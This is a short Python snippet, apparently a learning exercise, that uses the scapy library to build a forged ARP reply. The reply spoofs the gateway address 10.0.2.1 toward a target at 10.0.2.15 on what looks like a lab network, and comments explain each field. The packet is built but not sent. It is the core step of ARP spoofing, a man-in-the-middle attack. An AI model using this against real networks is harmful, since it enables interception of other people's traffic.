# pdst target IP
# op = 1 == arp request, op = 2 == arp response
# hwdst mac addr
# psrc ip that you are pretenting to be

import scapy.all as scapy

packet = scapy.ARP(op=2, pdst="10.0.2.15", hwdst="08:00:27:e6:e5:59", psrc="10.0.2.1")
# op flag: 1 = arp request, 2 = arp response
# pdst is the IP of the target
# hwdst is the MAC addr of the target
# psrc is the IP I am spoofing from